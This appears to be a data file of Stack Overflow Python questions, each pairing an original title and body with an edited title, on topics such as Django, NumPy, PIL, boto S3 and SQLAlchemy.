in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [notice] SIGHUP received. Attempting to restart[Wed Feb 29 00:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [notice] Digest: generating secret for digest authentication ...[Wed Feb 29 01:45:36 2012] [notice] Digest: done[Wed Feb 29 01:45:36 2012] [warn] mod_wsgi: Compiled for Python/2.6.2.[Wed Feb 29 01:45:36 2012] [warn] mod_wsgi: Runtime using Python/2.6.6.[Wed Feb 29 01:45:36 2012] [notice] Apache/2.2.15 (Unix) mod_auth_pgsql/2.0.3 PHP/5.3.3 mod_ssl/2.2.15 OpenSSL/1.0.0-fips mod_wsgi/3.2 Python/2.6.6 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations <VirtualHost *:80> ServerName django.satoshi.example.com ErrorLog ""/var/log/httpd/django_error_log"" WSGIDaemonProcess django WSGIProcessGroup django Alias /media/ ""/usr/lib/python2.6/site-packages/django/contrib/admin/media"" <Directory ""/usr/lib/python2.6/site-packages/django/contrib/admin/media""> Order allow,deny Options Indexes Allow from all IndexOptions FancyIndexing </Directory> <Directory ""/var/www/html/mysite""> Order allow,deny Options Indexes Allow from all IndexOptions FancyIndexing </Directory> WSGIScriptAlias / ""/var/www/html/mysite/apache/django.wsgi"" <Directory ""/var/www/html/mysite/apache""> Order deny,allow Allow from all </Directory></VirtualHost> import osimport syspaths = [ '/var/www/html/mysite', '/var/www/html', '/usr/lib/python2.6/site-packages/',]for path in paths: if path not in sys.path: sys.path.append(path)os.environ['DJANGO_SETTINGS_MODULE'] = 'mysite.settings'import django.core.handlers.wsgiapplication = django.core.handlers.wsgi.WSGIHandler() # Absolute filesystem path to the directory that will hold user-uploaded files. # Example: ""/home/media/media.lawrence.com/media/""MEDIA_ROOT = ''# URL that handles the media served from MEDIA_ROOT. Make sure to use a# trailing slash.# Examples: ""http://media.lawrence.com/media/"", ""http://example.com/media/""MEDIA_URL = ''# Absolute path to the directory static files should be collected to.# Don't put anything in this directory yourself; store your static files# in apps' ""static/"" subdirectories and in STATICFILES_DIRS.# Example: ""/home/media/media.lawrence.com/static/""PROJECT_ROOT = os.path.normpath(os.path.dirname(__file__))STATIC_ROOT = os.path.join(PROJECT_ROOT, 'static')# URL prefix for static files.# Example: ""http://media.lawrence.com/static/""STATIC_URL = '/static/'# URL prefix for admin static files -- CSS, JavaScript and images.# Make sure to use a trailing slash.# Examples: ""http://foo.com/static/admin/"", ""/static/admin/"".ADMIN_MEDIA_PREFIX = '/static/admin/'# Additional locations of static filesSTATICFILES_DIRS = ( # Put strings here, like ""/home/html/static"" or ""C:/www/django/static"". # Always use forward slashes, even on Windows. # Don't forget to use absolute paths, not relative paths.)# List of finder classes that know how to find static files in# various locations.STATICFILES_FINDERS = ( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder',# 'django.contrib.staticfiles.finders.DefaultStorageFinder',)",Apache not serving django admin static files
Python: How to append the string 'ub' to every pronounced vowel in a string?," Example: Speak -> Spubeak, more info hereDon't give me a solution, but point me in the right direction or tell which which python library I could use? I am thinking of regex since I have to find a vowel, but then which method could I use to insert 'ub' in front of a vowel? <code> ",Python: How to prepend the string 'ub' to every pronounced vowel in a string?
Using python PIL to turn a RGB image into a pure black and white image," I'm using the Python Imaging Library for some very simple image manipulation, however I'm having trouble converting a greyscale image to a monochrome (black and white) image. If I save after changing the image to greyscale (convert('L')) then the image renders as you would expect. However, if I convert the image to a monochrome, single-band image it just gives me noise as you can see in the images below. Is there a simple way to take a colour png image to a pure black and white image using PIL / python?  <code>  from PIL import Image import ImageEnhanceimport ImageFilterfrom scipy.misc import imsaveimage_file = Image.open(""convert_image.png"") # open colour imageimage_file= image_file.convert('L') # convert image to monochrome - this worksimage_file= image_file.convert('1') # convert image to black and whiteimsave('result_col.png', image_file)",Using PIL to turn a RGB image into a pure black and white image
iteretaing over related objects in django," I have these models: in views.py : I've changed this code in many ways but I'm repeatedly get this error: any suggestion? <code>  class Person(models.Model): name=models.CharField(max_length=100) family=models.CharField(max_length=100)class MailContact(models.Model): person=models.ForeignKey(Person) email=models.CharField(max_length=100) #some fieldsclass Participant(models.Model): person=models.ForeignKey(Person) #some fields emails = [] for participant in participants: for contact in participant__person__mailContact_set: emails.append(contact.email) send_mail(email_subject,email_body,'receiver_email_address@gmail.com',emails,fail_silently=False) global name 'participant__person__mailContact_set' is not defined",iterating over related objects in django
How to see when there are changes/enhancements CPython documentation," ""What's new"" sections, message boards, community, etc, are great, but what happens when a reference I've read, am familiar with, and may never look at again (or think I don't need to), gets a significant update. I fear I may potentially miss the point of something useful when some new insightful examples or more complete documentation is created. Perhaps, even the removal of incorrect or confusing documentation (GASP!).Don't get me wrong, between Google Search, Stack Overflow, PEPs, and the well interlinked documentation, I usually am able to get as much detail as I want, very quickly. BUT as I gain familiarity with the language I would certainly like to review enhancements to such documentation if it's something I use often.Is there a resource I can use to find this type of information already? <code> ",How to see when there are changes/enhancements to the CPython documentation
Calculate HItting Time between 2 nodes using NetworkX," I would like to know if i can use NetworkX to implement hitting time? Basically I want to calculate the hitting time between any 2 nodes in a graph. My graph is unweighted and undirected. If I understand hitting time correctly, it is very similar to the idea of PageRank. Any idea how can I implement hitting time using the PageRank method provided by NetworkX?May I know if there's any good starting point to work with?I've checked: MapReduce, Python and NetworkXbut not quite sure how it works. <code> ",Calculate Hitting Time between 2 nodes using NetworkX
Is there a python library that allows to easily print ascii-art text?," I have a program that dumps a lot of output, and I want some of that output to really stand out. One way could be to render important text with ascii art, like this web service does for example: other solutions could be colored or bold output. So how to do this sort of stuff easily in Python? <code>  # # ## ##### # # # # # #### # # # # # # ## # # ## # # # # # # # # # # # # # # # # # # ## # ###### ##### # # # # # # # # ### ## ## # # # # # ## # # ## # # # # # # # # # # # # # #### ",How to easily print ascii-art text?
Log FFT OR high-precision convolution (python)," I have a slightly unusual problem, but I am trying to avoid re-coding FFT. In general, I want to know this: If I have an algorithm that is implemented for type float, but it would work wherever a certain set of operations is defined (e.g. complex numbers, for which also define +, *, ...), what is the best way to use that algorithm on another type that supports those operations? In practice this is tricky because generally numeric algorithms are written for speed, not generality.Specifically:I am working with values with a very high dynamic range, and so I would like to store them in log space (mostly to avoid underflow). What I'd like is the log of the FFT of some series: Even this will result in significant underflow. What I'd like is to store log values and use + in place of * and logaddexp in place of +, etc.My thought of how to do this was to implement a simple LogFloat class that defines these primitive operations (but operates in log space). Then I could simply run the FFT code by letting it use my logged values. Then, the idea would be to construct a list of LogFloats, and then use it in the FFT: This can definitely be done if I re-implement FFT (and simply use LogFloat wherever I would use float before, but I thought I would ask for advice. This is a fairly recurring problem: I have a stock algorithm that I want to operate in log space (and it only uses a handful of operations like '+', '-', '', '/', etc.).This reminds me of writing generic functions with templates, so that the return arguments, parameters, etc. are constructed from the same type. For exmaple, if you can do an FFT of floats, you should be able to easily do one on complex values (by simply using a class that provides the necessary operations for complex values). As it currently stands, it looks like all FFT implementations are written for bleeding-edge speed, and so won't be very general. So as of now, it looks like I'd have to reimplement FFT for generic types...The reason I'm doing this is because I want very high-precision convolutions (and the N^2 runtime is extremely slow). Any advice would be greatly appreciated. *Note, I might need to implement trigonometric functions for LogFloat, and that would be fine. EDIT:This does work because LogFloat is a commutative ring (and it doesn't require implementation of trigonometric functions for LogFloat). The simplest way to do it was to reimplement FFT, but @J.F.Sebastian also pointed out a way of using the Python generic convolution, which avoids coding the FFT (which, again, was quite easy using either a DSP textbook or the Wikipedia pseudocode).  <code>  x = [1,2,3,4,5]fft_x = [ log( x_val ) for x_val in fft(x) ] class LogFloat: def __init__(self, sign, log_val): assert(float(sign) in (-1, 1)) self.sign = int(sign) self.log_val = log_val @staticmethod def from_float(fval): return LogFloat(sign(fval), log(abs(fval))) def __imul__(self, lf): self.sign *= lf.sign self.log_val += lf.log_val return self def __idiv__(self, lf): self.sign *= lf.sign self.log_val -= lf.log_val return self def __iadd__(self, lf): if self.sign == lf.sign: self.log_val = logaddexp(self.log_val, lf.log_val) else: # subtract the smaller magnitude from the larger if self.log_val > lf.log_val: self.log_val = log_sub(self.log_val, lf.log_val) else: self.log_val = log_sub(lf.log_val, self.log_val) self.sign *= -1 return self def __isub__(self, lf): self.__iadd__(LogFloat(-1 * lf.sign, lf.log_val)) return self def __pow__(self, lf): # note: there may be a way to do this without exponentiating # if the exponent is 0, always return 1# print self, '**', lf if lf.log_val == -float('inf'): return LogFloat.from_float(1.0) lf_value = lf.sign * math.exp(lf.log_val) if self.sign == -1: # note: in this case, lf_value must be an integer return LogFloat(self.sign**int(lf_value), self.log_val * lf_value) return LogFloat(self.sign, self.log_val * lf_value) def __mul__(self, lf): temp = LogFloat(self.sign, self.log_val) temp *= lf return temp def __div__(self, lf): temp = LogFloat(self.sign, self.log_val) temp /= lf return temp def __add__(self, lf): temp = LogFloat(self.sign, self.log_val) temp += lf return temp def __sub__(self, lf): temp = LogFloat(self.sign, self.log_val) temp -= lf return temp def __str__(self): result = str(self.sign * math.exp(self.log_val)) + '(' if self.sign == -1: result += '-' result += 'e^' + str(self.log_val) + ')' return result def __neg__(self): return LogFloat(-self.sign, self.log_val) def __radd__(self, val): # for sum if val == 0: return self return self + val x_log_float = [ LogFloat.from_float(x_val) for x_val in x ]fft_x_log_float = fft(x_log_float)",Generic programming: Log FFT OR high-precision convolution (python)
Unittesting philosophies," I have been trying to get the hang of TDD and unit testing (in python, using nose) and there are a few basic concepts which I'm stuck on. I've read up a lot on the subject but nothing seems to address my issues - probably because they're so basic they're assumed to be understood.The idea of TDD is that unit tests are written before the code they test. Unit test should test small portions of code (e.g. functions) which, for the purposes of the test, are self-contained and isolated. However, this seems to me to be highly dependent on the implementation. During implementation, or during a later bugfix it may become necessary to abstract some of the code into a new function. Should I then go through all my tests and mock out that function to keep them isolated? Surely in doing this there is a danger of introducing new bugs into the tests, and the tests will no longer test exactly the same situation?From my limited experience in writing unit tests, it appears that completely isolating a function sometimes results in a test that is longer and more complicated than the code it is testing. So if the test fails all it tells you is that there is either a bug in the code or in the test, but its not obvious which. Not isolating it may mean a much shorter and easier to read test, but then its not a unit test...Often, once isolated, unit tests seem to be merely repeating the function. E.g. if there is a simple function which adds two numbers, then the test would probably look something like assert add(a, b) == a + b. Since the implementation is simply return a + b, what's the point in the test? A far more useful test would be to see how the function works within the system, but this goes against unit testing because it is no longer isolated.My conclusion is that unit tests are good in some situations, but not everywhere and that system tests are generally more useful. The approach that this implies is to write system tests first, then, if they fail, isolate portions of the system into unit tests to pinpoint the failure. The problem with this, obviously, is that its not so easy to test corner cases. It also means that the development is not fully test driven, as unit tests are only written as needed.So my basic questions are:Should unit tests be used everywhere, however small and simple the function?How does one deal with changing implementations? I.e. should the implementation of the tests change continuously too, and doesn't this reduce their usefulness?What should be done when the test gets more complicated than the code its testing?Is it always best to start with unit tests, or is it better to start with system tests, which at the start of development are much easier to write? <code> ",How to approach unittesting and TDD (using python + nose)
Whera are 'package data' files?," I've created package with distutils including package data.When i look in tar.gz of my package I see expected files, BUT after package installation (by pip or by 'python setup.py install') there is no any package data. Only python scripts included. My setup.py is: <code>  # py3.3#from packaging.core import setup# py3.2from distutils.core import setupsetup( name = 'mypkg', version = '0.7dev', author = 'Projekt Alef', author_email = 'tymoteusz.jankowski@gmail.com', packages = [ 'my_pkg', 'my_pkg/tests', 'my_pkg/plugins', ], #scritps=['bin/setup.sh',],)",Where are 'package data' files?
pick N items at random," I am trying to write an algorithm that would pick N distinct items from an sequence at random, without knowing the size of the sequence in advance, and where it is expensive to iterate over the sequence more than once. For example, the elements of the sequence might be the lines of a huge file.I have found a solution when N=1 (that is, ""pick exactly one element at random from a huge sequence""): But how can I achieve the same thing for other values of N (say, N=3)? <code>  import randomitems = range(1, 10) # Imagine this is a huge sequence of unknown lengthcount = 1selected = Nonefor item in items: if random.random() * count < 1: selected = item count += 1","Pick N distinct items at random from sequence of unknown length, in only one iteration"
pick N items at random from sequence of unknown length," I am trying to write an algorithm that would pick N distinct items from an sequence at random, without knowing the size of the sequence in advance, and where it is expensive to iterate over the sequence more than once. For example, the elements of the sequence might be the lines of a huge file.I have found a solution when N=1 (that is, ""pick exactly one element at random from a huge sequence""): But how can I achieve the same thing for other values of N (say, N=3)? <code>  import randomitems = range(1, 10) # Imagine this is a huge sequence of unknown lengthcount = 1selected = Nonefor item in items: if random.random() * count < 1: selected = item count += 1","Pick N distinct items at random from sequence of unknown length, in only one iteration"
Pick N items at random from sequence of unknown length," I am trying to write an algorithm that would pick N distinct items from an sequence at random, without knowing the size of the sequence in advance, and where it is expensive to iterate over the sequence more than once. For example, the elements of the sequence might be the lines of a huge file.I have found a solution when N=1 (that is, ""pick exactly one element at random from a huge sequence""): But how can I achieve the same thing for other values of N (say, N=3)? <code>  import randomitems = range(1, 10) # Imagine this is a huge sequence of unknown lengthcount = 1selected = Nonefor item in items: if random.random() * count < 1: selected = item count += 1","Pick N distinct items at random from sequence of unknown length, in only one iteration"
finding index of an item closest to the value in a list that's not entirely sorted," As an example my list is: and I'm looking for the index of the value closest to 11.5. I've tried other methods such as binary search and bisect_left but they don't work.I cannot sort this array, because the index of the value will be used on a similar array to fetch the value at that index. <code>  [25.75443, 26.7803, 25.79099, 24.17642, 24.3526, 22.79056, 20.84866, 19.49222, 18.38086, 18.0358, 16.57819, 15.71255, 14.79059, 13.64154, 13.09409, 12.18347, 11.33447, 10.32184, 9.544922, 8.813385, 8.181152, 6.983734, 6.048035, 5.505096, 4.65799]",Finding index of an item closest to the value in a list that's not entirely sorted
"In practice, what are the main uses for the new ""yield from"" syntax in Python 3.3?"," I'm having a hard time wrapping my brain around PEP 380.What are the situations where yield from is useful?What is the classic use case?Why is it compared to micro-threads?So far I have used generators, but never really used coroutines (introduced by PEP-342). Despite some similarities, generators and coroutines are basically two different concepts. Understanding coroutines (not only generators) is the key to understanding the new syntax.IMHO coroutines are the most obscure Python feature, most books make it look useless and uninteresting.Thanks for the great answers, but special thanks to agf and his comment linking to David Beazley presentations. <code> ","In practice, what are the main uses for the ""yield from"" syntax in Python 3.3?"
Return order of numpy array," I'm trying to return an array which has the rank of each value in an array. For example, given the array below: I would want to return the array: Such that the values in the returned array indicate the ascending order of the array (ie, the value in the returned array indicates which is largest). Using argsort, I can only tell how the values should be reordered: Let me know if this is unclear. <code>  import numpy as nparr1 = np.array([4, 5, 3, 1]) array([2, 3, 1, 0]) arr1.argsort()array([3, 2, 0, 1])",Return order of NumPy array
Pyramid socket.io error," I'm trying to create a simple WebSocket application using Pyramid and socket.io frameworks.Server-side code: Client code: I need this code to use web-sockets for the connection, but it falls back to XHR-polling. How can I fix it? Thanks in advance, Ivan. <code>  from pyramid.response import Responsefrom pyramid_socketio.io import SocketIOContext, socketio_manageimport geventdef includeme(config): ''' This method is called on the application startup. ''' config.add_route('socket.io', 'socket.io/*remaining')class ConnectIOContext(SocketIOContext): # self.io is the Socket.IO socket # self.request is the request def msg_connect(self, msg): print ""Connect message received"", msg self.msg(""connected"", hello=""world"")# Socket.IO implementation@view_config(route_name=""socket.io"")def socketio_service(request): print ""Socket.IO request running"" print request retval = socketio_manage(ConnectIOContext(request)) return Response(retval) <script> var socket = null; $(document).ready(function() { socket = new io.Socket(null, null); socket.on('connect', function() { console.log(""Connected""); socket.send({type: ""connect"", userid: 123}); }); socket.on('message', function(obj) { console.log(""Message received""); console.log(""Message"", JSON.stringify(obj)); if (obj.type == ""some"") { console.log(""do some""); } }); socket.on('error', function(obj) { console.log(""Error"", JSON.stringify(obj)); }); socket.on('disconnect', function() { console.log(""Disconnected""); }); console.log(""Connecting...""); socket.connect();});</script> ",How to use Websockets with Pyramid and socket.io?
how to convert tamil unicode string in to tamil letters in python?," Here is the list of Tamil unicode codepoints[u'\u0b9a', u'\u0b9f', u'\u0bcd', u'\u0b9f', u'\u0b9a', u'\u0baa', u'\u0bc8', u'\u0baf', u'\u0bbf', u'\u0bb2', u'\u0bcd', u'\u0ba8', u'\u0bc7', u'\u0bb1', u'\u0bcd', u'\u0bb1', u'\u0bc1]How can I convert it to readable string? <code> ",How to convert array of tamil unicode values into tamil string in python with whitespaces?
how to display tamil unicode string in to tamil letters in python with whitespaces?," Here is the list of Tamil unicode codepoints[u'\u0b9a', u'\u0b9f', u'\u0bcd', u'\u0b9f', u'\u0b9a', u'\u0baa', u'\u0bc8', u'\u0baf', u'\u0bbf', u'\u0bb2', u'\u0bcd', u'\u0ba8', u'\u0bc7', u'\u0bb1', u'\u0bcd', u'\u0bb1', u'\u0bc1]How can I convert it to readable string? <code> ",How to convert array of tamil unicode values into tamil string in python with whitespaces?
Use python to scrape an excel file from Google App Engine," I'm trying to scrape an excel file from a government ""muster roll"" database. However, the URL I have to access this excel file:http://nrega.ap.gov.in/Nregs/FrontServlet?requestType=HouseholdInf_engRH&hhid=192420317026010002&actionVal=musterrolls&type=Normalrequires that I have a session cookie from the government site attached to the request.How could I grab the session cookie with an initial request to the landing page (when they give you the session cookie) and then use it to hit the URL above to grab our excel file? I'm on Google App Engine using Python.I tried this: I'm pretty sure this isn't the best way to do this. How could I do this more cleanly, or even using the requests library? <code>  import urllib2import cookieliburl = 'http://nrega.ap.gov.in/Nregs/FrontServlet?requestType=HouseholdInf_engRH&hhid=192420317026010002&actionVal=musterrolls&type=Normal'def grab_data_with_cookie(cookie_jar, url): opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar)) data = opener.open(url) return datacj = cookielib.CookieJar()#grab the data data1 = grab_data_with_cookie(cj, url)#the second time we do this, we get back the excel sheet.data2 = grab_data_with_cookie(cj, url)stuff2 = data2.read()",Scrape a web page that requires they give you a session cookie first
Use python to scrape an excel file and save on Google App Engine," I'm trying to scrape an excel file from a government ""muster roll"" database. However, the URL I have to access this excel file:http://nrega.ap.gov.in/Nregs/FrontServlet?requestType=HouseholdInf_engRH&hhid=192420317026010002&actionVal=musterrolls&type=Normalrequires that I have a session cookie from the government site attached to the request.How could I grab the session cookie with an initial request to the landing page (when they give you the session cookie) and then use it to hit the URL above to grab our excel file? I'm on Google App Engine using Python.I tried this: I'm pretty sure this isn't the best way to do this. How could I do this more cleanly, or even using the requests library? <code>  import urllib2import cookieliburl = 'http://nrega.ap.gov.in/Nregs/FrontServlet?requestType=HouseholdInf_engRH&hhid=192420317026010002&actionVal=musterrolls&type=Normal'def grab_data_with_cookie(cookie_jar, url): opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar)) data = opener.open(url) return datacj = cookielib.CookieJar()#grab the data data1 = grab_data_with_cookie(cj, url)#the second time we do this, we get back the excel sheet.data2 = grab_data_with_cookie(cj, url)stuff2 = data2.read()",Scrape a web page that requires they give you a session cookie first
Use python to scrape an excel file," I'm trying to scrape an excel file from a government ""muster roll"" database. However, the URL I have to access this excel file:http://nrega.ap.gov.in/Nregs/FrontServlet?requestType=HouseholdInf_engRH&hhid=192420317026010002&actionVal=musterrolls&type=Normalrequires that I have a session cookie from the government site attached to the request.How could I grab the session cookie with an initial request to the landing page (when they give you the session cookie) and then use it to hit the URL above to grab our excel file? I'm on Google App Engine using Python.I tried this: I'm pretty sure this isn't the best way to do this. How could I do this more cleanly, or even using the requests library? <code>  import urllib2import cookieliburl = 'http://nrega.ap.gov.in/Nregs/FrontServlet?requestType=HouseholdInf_engRH&hhid=192420317026010002&actionVal=musterrolls&type=Normal'def grab_data_with_cookie(cookie_jar, url): opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar)) data = opener.open(url) return datacj = cookielib.CookieJar()#grab the data data1 = grab_data_with_cookie(cj, url)#the second time we do this, we get back the excel sheet.data2 = grab_data_with_cookie(cj, url)stuff2 = data2.read()",Scrape a web page that requires they give you a session cookie first
Python - time.sleep requires integers?," I'm writing a macro that will click certain spots on the screen when I press a key. The first time I press a key, everything runs fine.However, any other key press results in the error: Here is the code: It seems the first time the DeleteRun function is run by pyHook, time.sleep() accepts floats.On any following function calls, it seems it only accepts integers.What is causing this?I can't wait 5 seconds for the mouse arrangement! It's supposed to save time!Specs:python 2.7.2 Windows 7 (32)  <code>  time.sleep(0.1)TypeError: an integer is required import win32apiimport win32conimport timeimport pythoncomimport pyHookimport osdef Click(x,y): win32api.SetCursorPos((x,y)) win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0) win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,x,y,0,0)def DeleteRun(event): Click(1250, 741) time.sleep(0.1) Click(649,261) time.sleep(0.1) Click(651, 348) time.sleep(0.1) Click(800, 442) time.sleep(0.1) Click(865, 612)Click(20,20)KeyGrabber = pyHook.HookManager()KeyGrabber.KeyDown = DeleteRunKeyGrabber.HookKeyboard()pythoncom.PumpMessages()",time.sleep requires integers?
Setting a realtive frequency in a matplotlib histogram," I have data as a list of floats and I want to plot it as a histogram. Hist() function does the job perfectly for plotting the absolute histogram. However, I cannot figure out how to represent it in a relative frequency format - I would like to have it as a fraction or ideally as a percentage on the y-axis.Here is the code: I thought normed=1 argument would do it, but it gives fractions that are too high and sometimes are greater than 1. They also seem to depend on the bin size, as if they are not normalized by the bin size or something. Nevertheless, when I set cumulative=1, it nicely sums up to 1. So, where is the catch? By the way, when I feed the same data into Origin and plot it, it gives me perfectly correct fractions. Thank you! <code>  fig = plt.figure()ax = fig.add_subplot(111)n, bins, patches = ax.hist(mydata, bins=100, normed=1, cumulative=0)ax.set_xlabel('Bins', size=20)ax.set_ylabel('Frequency', size=20)ax.legendplt.show()",Setting a relative frequency in a matplotlib histogram
creating a dynamic numpy array (2d) on a fly," I am having a hard time creating a numpy 2D array on the fly.So basically I have a for loop something like this. creates a 1D numpy array of this list and now I want to append it to a numpy array so basically converting list of lists to array of arrays? I have checked the manual.. and np.append() methods that doesn't work as for np.append() to work, it needs two arguments to append it together.Any clues? <code>  for ele in huge_list_of_lists: instance = np.array(ele) ",Create a dynamic 2D numpy array on the fly
creating a dynamic numpy array (2d) on the fly," I am having a hard time creating a numpy 2D array on the fly.So basically I have a for loop something like this. creates a 1D numpy array of this list and now I want to append it to a numpy array so basically converting list of lists to array of arrays? I have checked the manual.. and np.append() methods that doesn't work as for np.append() to work, it needs two arguments to append it together.Any clues? <code>  for ele in huge_list_of_lists: instance = np.array(ele) ",Create a dynamic 2D numpy array on the fly
convenient slicing of DataFrames with datetime indexes in pandas," I have a pandas.DataFrame df1, indexed with a pandas.DateRange object.If I have a d1 and d2, as datetimes, why does df[d1:d2]not work, and how can I obtain this slice? <code> ",How to perform slicing of a data frame using datetimes?
python csv library always uses dos end-of-line character?," I realize that the csv library in Python always generates DOS end-of-line characters. Even if I use the 'wb' mode, even if I use Linux. The above code always uses '\r\n' as the end of line separator. How can I make it use use '\n' only? <code>  import csvf = open('output.txt', 'wb');writer = csv.writer(f)writer.writerow([2,3,4]);f.close()",Does Python csv writer always use DOS end-of-line characters?
regular expression non capturing lookahead assertion, Is there an ability to make a lookahead assertion non-capturing? Things like bar(?:!foo) and bar(?!:foo) do not work (Python). <code> ,regular expression matching a string that is followed with another string without capturing the latter
Python binding one button to two events with Tkinter," I am just getting started with programming and am making a Tic-Tac-Toe program. In my program I have a display function, which changes and makes sure what entered is valid, and a win checker. Is there a way that I can bind both of these functions to the enter key? Something like: <code>  RowEnt.bind(""<Return>"", display, checkWin)",Binding one button to two events with Tkinter
How to deleting rows from a table using an SQLAlchemy query without ORM?," I'm writing a quick and dirty maintenace script to delete some rows and would like to avoid having to bring my ORM classes/mappings over from the main project. I have a query that looks similar to: According to everything I've read, if I was using the ORM (not 'just' tables) and passed in something like: I could add a .delete() to the query, but when I try to do this using only tables I get a complaint: Which makes sense as its a table, not a class. I'm quite green when it comes to SQLAlchemy, how should I be going about this? <code>  address_table = Table('address',metadata,autoload=True)addresses = session.query(addresses_table).filter(addresses_table.c.retired == 1) addresses = session.query(Addresses).filter(addresses_table.c.retired == 1) File ""/usr/local/lib/python2.6/dist-packages/sqlalchemy/orm/query.py"", line 2146, in delete target_cls = self._mapper_zero().class_AttributeError: 'NoneType' object has no attribute 'class_'",How to delete rows from a table using an SQLAlchemy query without ORM?
Select cells from array defined in second array," I have something like and My target is I tried _ix as I read at Simplfy row AND column extraction, numpy, but this did not result in what I wanted. p.s. Please change the title of this question if you can think of a more precise one. <code>  m = array([[1, 2], [4, 5], [7, 8], [6, 2]]) select = array([0,1,0,0]) result = array([1, 5, 7, 6])",Indexing NumPy 2D array with another 2D array
Python regular expression to return all characters between two special characters," How would I go about using regx to return all characters between two brackets.Here is an example: I found a regex to do it between curly brackets but all attempts at making it work with square brackets have failed. Here is that regex: (?<={)[^}]*(?=}) and here is my attempt to hack it Final Solution: <code>  foobar['infoNeededHere']dddneeds to return infoNeededHere (?<=[)[^}]*(?=]) import restr = ""foobar['InfoNeeded'],""match = re.match(r""^.*\['(.*)'\].*$"",str)print match.group(1)",Regular expression to return all characters between two special characters
How save an XML file to disk with python?," I have some python code to generate some XML text with xml.dom.minidom . Right now, I run it from the terminal and it outputs me a structured XML as a result. I would like it also to generate an XML file and save it to my disk. How could that be done?This is what I have: This just generates the XML. How could I also have it saved as a file to my desktop? <code>  import xmlfrom xml.dom.minidom import Documentimport copyclass dict2xml(object): doc = Document() def __init__(self, structure): if len(structure) == 1: rootName = str(structure.keys()[0]) self.root = self.doc.createElement(rootName) self.doc.appendChild(self.root) self.build(self.root, structure[rootName]) def build(self, father, structure): if type(structure) == dict: for k in structure: tag = self.doc.createElement(k) father.appendChild(tag) self.build(tag, structure[k]) elif type(structure) == list: grandFather = father.parentNode tagName = father.tagName # grandFather.removeChild(father) for l in structure: tag = self.doc.createElement(tagName.rstrip('s')) self.build(tag, l) father.appendChild(tag) else: data = str(structure) tag = self.doc.createTextNode(data) father.appendChild(tag) def display(self): print self.doc.toprettyxml(indent="" "")",How to save an XML file to disk with python?
Sorting a dictionary by key then value (python)," I can sort by key or value, but I need it sorted by value, then key, in one line. To explain this better I can show you my problem: I want my output to be sorted descending by their value and then ascending (A-Z) by their key (alphabetically). Resulting in such a list:With the output of: ['peach', 'banana', 'beetroot', 'almond', 'apple']The only way I know how to do it so far is: With the output of: ['almond', 'apple', 'banana', 'beetroot', 'peach']So it has sorted the values in ascending order and the keys alphabetically in ascending order (A-Z). So if I reverse this: With the output of: ['peach', 'beetroot', 'banana', 'apple', 'almond']It has sorted the values in descending order and the keys alphabetically in descending order (Z-A). Is there a way I can sort the values in descending order and the keys in ascending order (i.e. A-Z) and get the output I showed above? <code>  dict = {'apple': 2, 'banana': 3, 'almond':2 , 'beetroot': 3, 'peach': 4} [v[0] for v in sorted(dict.items(), key=lambda(k,v): (v,k))] [v[0] for v in sorted(dict.items(), key=lambda(k,v): (v,k), reverse=True)]",Sorting a dictionary by value then key
S3 boto list keys returns directory in Ireland not in us-west," I've noticed a difference between the returns from boto's api depending on the bucket location. I have the following code: which im running against two buckets, one in us-west and one in ireland. Path in this bucket is a sub-directory, against Ireland I get the sub directory and any keys underneath, against us-west I only get the keys beneath.So Ireland gives: where as US Standard gives: Obviously, I want to be able to write the same code regardless of bucket location. Anyone know of anything I can do to work around this so I get the same predictable results. Or even if it's boto causing the problem or S3. I noticed there is a different policy for naming buckets in Ireland, do different locals have their own version of the api's?Thanks,Steve <code>  con = S3Connection(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)bucket = con.get_bucket(S3_BUCKET_NAME)keys = bucket.list(path)for key in keys: print key <Key: <bucketName>,someDir/><Key: <bucketName>,someDir/someFile.jpg><Key: <bucketName>,someDir/someOtherFile.jpg> <Key: <bucketName>,someDir/someFile.jpg><Key: <bucketName>,someDir/someOtherFile.jpg>",S3 boto list keys sometimes returns directory key
S3 boto list keys returns directory in Ireland not in US Standard," I've noticed a difference between the returns from boto's api depending on the bucket location. I have the following code: which im running against two buckets, one in us-west and one in ireland. Path in this bucket is a sub-directory, against Ireland I get the sub directory and any keys underneath, against us-west I only get the keys beneath.So Ireland gives: where as US Standard gives: Obviously, I want to be able to write the same code regardless of bucket location. Anyone know of anything I can do to work around this so I get the same predictable results. Or even if it's boto causing the problem or S3. I noticed there is a different policy for naming buckets in Ireland, do different locals have their own version of the api's?Thanks,Steve <code>  con = S3Connection(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)bucket = con.get_bucket(S3_BUCKET_NAME)keys = bucket.list(path)for key in keys: print key <Key: <bucketName>,someDir/><Key: <bucketName>,someDir/someFile.jpg><Key: <bucketName>,someDir/someOtherFile.jpg> <Key: <bucketName>,someDir/someFile.jpg><Key: <bucketName>,someDir/someOtherFile.jpg>",S3 boto list keys sometimes returns directory key
